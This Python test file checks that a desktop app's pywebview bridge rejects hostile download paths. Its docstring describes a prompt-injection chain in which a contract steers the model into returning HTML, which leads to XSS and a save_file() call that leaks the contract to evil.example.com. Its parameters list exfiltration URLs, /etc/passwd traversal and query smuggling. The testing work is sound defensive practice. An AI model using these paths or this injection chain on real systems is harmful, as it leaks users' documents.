"""Ограничение моста JS↔Python (window.pywebview.api).

Мост — единственный способ для кода в окне обратиться к Python, поэтому
его аргументы надо считать враждебными. В окне отображается ответ модели и
текст загруженного документа, а моделью косвенно управляет автор договора:
документ с внедрённой инструкцией может заставить её вернуть в поле
«критичность» произвольный HTML.

Цепочка, которую разрывает проверка: договор → внедрённая инструкция →
HTML в ответе модели → XSS в окне → вызов save_file() с чужим адресом.
При склейке `base_url + download_path` строка «@evil.example.com/collect»
превращает адрес в `http://127.0.0.1:8000@evil.example.com/collect`:
«127.0.0.1:8000» становится ИМЕНЕМ ПОЛЬЗОВАТЕЛЯ, и договор уходит на чужой
сервер. Машина не изолирована от сети — она качает модель и обновления.
"""

from __future__ import annotations

import pytest
from fire_safety_desktop.main import _Api


@pytest.mark.parametrize(
    "path",
    [
        "/api/download/report.docx",
        # Фронтенд кодирует имя через encodeURIComponent — кириллица приходит
        # в процентной кодировке и обязана проходить.
        "/api/download/%D0%BF%D0%B8%D1%81%D1%8C%D0%BC%D0%BE.docx",
        "/api/download/letter_2026-07-29.docx",
    ],
)
def test_real_downloads_still_work(path: str) -> None:
    assert _Api._is_safe_download_path(path) is True


@pytest.mark.parametrize(
    ("path", "why"),
    [
        ("@evil.example.com/collect", "адрес-ловушка через userinfo — утечка договора"),
        ("http://evil.example.com/x", "абсолютный URL на чужой хост"),
        ("//evil.example.com/x", "протокол-относительный URL"),
        ("/api/download/../../../etc/passwd", "обход каталога вверх"),
        ("/api/download/sub/dir.docx", "подкаталог"),
        ("/api/download/x?url=http://evil", "подмена через query-параметр"),
        ("/api/download/x#@evil", "фрагмент"),
        ("/api/download/x\\..\\y", "обратный слэш — обход на Windows"),
        ("/api/history", "другой эндпоинт: чтение истории документов"),
        ("/api/download/", "пустое имя файла"),
        ("", "пустой путь"),
    ],
)
def test_hostile_paths_are_rejected(path: str, why: str) -> None:
    assert _Api._is_safe_download_path(path) is False, why


def test_rejected_path_does_not_perform_request(monkeypatch: pytest.MonkeyPatch) -> None:
    """Отказ обязан случиться ДО сетевого запроса.

    Иначе данные успеют уйти, даже если файл потом не сохранится.
    """
    called = False

    def _boom(*args: object, **kwargs: object) -> None:
        nonlocal called
        called = True
        raise AssertionError("запрос не должен был уйти")

    import fire_safety_desktop.main as main_mod

    monkeypatch.setattr(main_mod.httpx, "get", _boom)

    api = _Api("http://127.0.0.1:8000")
    result = api.save_file("@evil.example.com/collect", "x.docx")

    assert result["ok"] is False
    assert called is False
